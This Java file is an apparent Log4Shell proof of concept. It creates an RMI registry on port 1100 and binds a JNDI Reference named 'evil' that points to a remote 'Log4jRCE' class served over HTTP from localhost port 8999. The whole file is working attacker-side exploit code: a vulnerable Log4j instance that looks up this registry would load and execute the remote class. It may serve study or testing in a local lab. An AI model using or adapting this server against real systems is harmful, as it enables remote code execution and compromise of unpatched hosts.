package com.yangxvhao.demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

/**
 * @author yangxuhao on 2021-12-13.
 */
public class RmiServer {

  public static void main(String[] args) throws Exception {
    Registry registry = LocateRegistry.createRegistry(1100);
    String url = "http://127.0.0.1:8999/";
    System.out.println("Create RMI registry on port 1100");
    Reference reference = new Reference("Log4jRCE", "Log4jRCE", url);
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    registry.bind("evil", referenceWrapper);
  }
}
